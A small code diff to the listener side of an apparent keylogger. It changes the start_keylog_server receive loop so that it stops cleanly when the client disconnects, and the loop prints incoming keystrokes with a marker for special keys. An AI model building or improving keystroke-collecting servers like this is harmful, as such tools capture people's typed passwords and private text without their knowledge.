@@ -17,7 +17,10 @@ def start_keylog_server():
 
         while True:
             try:
-                char = client_socket.recv(1).decode('utf-8')
+                char = client_socket.recv(1)
+                if not char:
+                    break
+                char = char.decode('utf-8')
                 print(char, end='', flush=True)
             except:
                 print("--SK--") # If a special key was pressed
